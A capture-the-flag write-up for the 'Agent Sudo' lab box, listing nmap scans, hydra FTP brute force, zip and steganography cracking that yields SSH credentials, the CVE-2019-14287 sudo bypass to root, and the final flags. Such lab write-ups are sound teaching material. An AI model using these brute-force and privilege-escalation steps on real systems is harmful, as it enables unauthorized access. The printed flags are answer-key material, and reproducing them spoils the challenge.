================================================================================
CTF WRITEUP: AGENT SUDO
Target: 10.201.82.243
================================================================================

1. ENUMERATION
--------------------------------------------------------------------------------
Scan: nmap -sC -sV 10.201.82.243
Ports:
  21/tcp (FTP)   - vsftpd 3.0.3
  22/tcp (SSH)   - OpenSSH 7.6p1
  80/tcp (HTTP)  - Apache 2.4.29

2. WEB RECON
--------------------------------------------------------------------------------
The site requires a single-letter User-Agent (codename).
Command: curl -H "User-Agent: C" -L http://10.201.82.243/
Result: Username "chris" found. Password hint: "weak".

3. INITIAL ACCESS
--------------------------------------------------------------------------------
FTP Brute Force:
Command: hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.201.82.243
Creds: chris : crystal

4. STEGANOGRAPHY & CRACKING
--------------------------------------------------------------------------------
File Analysis:
- Found cutie.png, cute-alien.jpg, and To_agentJ.txt on FTP.
- Binwalk on cutie.png found an encrypted ZIP (8702.zip).

ZIP Cracking:
- zip2john 8702.zip > hash.txt
- john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
- Result: "alien"

Decryption:
- To_agentR.txt inside ZIP: "QXJlYTUx" (Base64)
- echo QXJlYTUx | base64 -d  => "Area51"

Steghide Extraction (cute-alien.jpg):
- Command: steghide extract -sf cute-alien.jpg (Pass: Area51)
- Result: SSH creds found in message.txt -> james : hackerrules

5. PRIVILEGE ESCALATION
--------------------------------------------------------------------------------
SSH Login: ssh james@10.201.82.243
User Flag: b03d975e8c92a7c04146cfa7a5a313c7

Sudo Bypass (CVE-2019-14287):
- sudo -l shows: (ALL, !root) /bin/bash
- Exploit: sudo -u#-1 /bin/bash
- Check: whoami => root

6. FINAL FLAGS
--------------------------------------------------------------------------------
[USER] b03d975e8c92a7c04146cfa7a5a313c7
[ROOT] b53a02f55b57d4439e3341834d70c062
================================================================================
